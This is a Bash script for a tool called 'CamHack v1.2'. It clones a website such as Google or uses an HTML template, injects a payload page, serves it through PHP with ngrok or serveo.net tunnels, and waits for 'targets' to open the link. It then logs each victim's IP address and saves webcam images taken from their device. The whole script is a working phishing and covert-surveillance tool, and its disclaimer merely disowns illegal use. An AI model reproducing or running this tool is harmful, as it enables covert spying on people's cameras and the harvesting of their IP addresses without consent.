#!/bin/bash
# CamHack v1.2
# Coded by: @byyozzi  (İnstagram)
# Github: https://github.com/SecreTOzi/SecreTCamHack

trap 'printf "\n";stop' 2
fl() {
	cd $PREFIX/bin
	}
	ch() {
		fl
		if [ -e curl ] || [ -e php ] || [ -e figlet ] || [ -e ssh ] || [ httrack ];then
		echo
		else
		printf "\n\n\033[1;91m Please install curl , php , figlet . openssh and httrack\n\n"
		exit
		fi
		}
		ch
		check() {
			pwd > /dev/null 2>&1
			}
R() {
	cd ~/CamHack
	python .random.py
	}
banner() {
R
figlet CamHack

printf "\n"                                                              
printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"                              
   v1.2 coded by @byyozzi              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              https://github.com/SecreTOzi           \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]	     Gölge HACK TİMİ BY SecreTOzi SecreTCamHack	\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]	     NAMI DİĞER : SecreTOzi Tarafından Kodlanmıştır	\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\n"
printf "\n"
printf "        \e[1;91m Disclaimer: Aracın Hiç Bir Sorumluluğunu\n"
printf "         Kabul Etmiyorum İllegal Yolda Kullanımı Kişiye Aittir\n"
printf "         VE Profilimde Daha Birçok Hack aracı Bulabilirsin\n"
printf "         CYBER TÜRK Hacker SecreTOzi!\n"



printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\e[1;77m (saved in /sdcard/CamHack/images)\e[0m\n"
cd ~/CamHack
cp -rf images /sdcard/CamHack
rm -rf Log.log
fi
sleep 0.5

done 

}



ngrok_server() {

cd ~/CamHack
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'amd64' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'amd64'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
cd ~/CamHack
./ngrok http 3333 > /dev/null 2>&1 &
sleep 15

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

if [[ -z $link ]];then
printf "\n\e[1;91m[!] Ngrok error, Not work\n"
ngrok_server
fi
printf "\n\n\e[1;92m[\e[0m+\e[1;92m] Share "
sleep 0.4
printf "\e[0m\e[1;77mNGROK"
sleep 0.4
printf "\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n\n" $link

}

start() {

if [[ ! -d images/ ]]; then
mkdir images
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Open website\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Open Html file\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: apt-get install httrack"; exit 1; }
default_website_mirror="https://www.google.com"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror 
read website_mirror
website_mirror="${website_mirror:-${default_website_mirror}}"
printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
if [[ ! -d websites/ ]]; then
mkdir websites
fi
check
httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
check
payload
ngrok_server
checkfound


elif [[ $option_server -eq 2 ]]; then
default_website_template="CamHack.html"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
website_template="${website_template:-${default_website_template}}"
if [[ -f $website_template ]]; then

if [[ $website_template == *'index.php'* ]]; then
printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
exit 1
fi

cat $website_template > index.php
cat template.html >> index.php
ngrok_server
checkfound

else
printf "\e[91m[!] File not found\n"
exit 1
fi

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

start2() {

if [[ ! -d images/ ]]; then
mkdir images
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Open website\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Open Html file\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: apt-get install httrack"; exit 1; }
default_website_mirror="https://www.google.com"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror 
read website_mirror
website_mirror="${website_mirror:-${default_website_mirror}}"
printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
if [[ ! -d websites/ ]]; then
mkdir websites
fi
check
httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
check
payload
serveo-link
checkfound


elif [[ $option_server -eq 2 ]]; then
default_website_template="CamHack.html"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
website_template="${website_template:-${default_website_template}}"
if [[ -f $website_template ]]; then

if [[ $website_template == *'index.php'* ]]; then
printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
exit 1
fi

cat $website_template > index.php
cat template.html >> index.php
serveo-link
checkfound

else
printf "\e[91m[!] File not found\n"
exit 1
fi

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

start3() {

if [[ ! -d images/ ]]; then
mkdir images
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Open website\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Open Html file\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: apt-get install httrack"; exit 1; }
default_website_mirror="https://www.google.com"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror 
read website_mirror
website_mirror="${website_mirror:-${default_website_mirror}}"
printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
if [[ ! -d websites/ ]]; then
mkdir websites
fi
check
httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
check
payload
serveo-link
ngrok_server
checkfound


elif [[ $option_server -eq 2 ]]; then
default_website_template="CamHack.html"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
website_template="${website_template:-${default_website_template}}"
if [[ -f $website_template ]]; then

if [[ $website_template == *'index.php'* ]]; then
printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
exit 1
fi

cat $website_template > index.php
cat template.html >> index.php
serveo-link
ngrok_server
checkfound

else
printf "\e[91m[!] File not found\n"
exit 1
fi

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}



serveo-link() {

default_choose_sub="Y"
default_subdomain="hcam2$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi
payload
server

}
server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m]\033[1;92m Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
if [ -z $send_link ];then
printf "\n\033[1;91m Serveo error\n"
serveo-link
fi
printf '\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n\n' $send_link

}
ngrok-start () {
	start
	}
	serveo-start () {
		start2
		}
		serveo-ngrok() {
			start3
			}



payload() {

index_file=$(grep -o 'HREF=".*"' websites/index.html | cut -d '"' -f2)

if [ -f websites/"$index_file" ]; then
cat websites/$index_file > index.php
cat template.html >> index.php
fi
}
men() {
	printf "\033[93m[\033[0m1\033[93m]\033[1;92m Serveo \n"
	printf "\033[93m[\033[0m2\033[93m]\033[1;92m Ngrok \n"
	printf "\033[93m[\033[0m3\033[93m]\033[1;92m Serveo and Ngrok \n\n"
	echo -e -n "\033[1;96m Select : \033[0m"
	read a
	if [ $a -eq 1 ];then
	serveo-start
	elif [ $a -eq 2 ];then
	ngrok-start
	elif [ $a -eq 3 ];then
	serveo-ngrok
	else
	printf "invalid "
	fi
	}
	


banner
dependencies
men
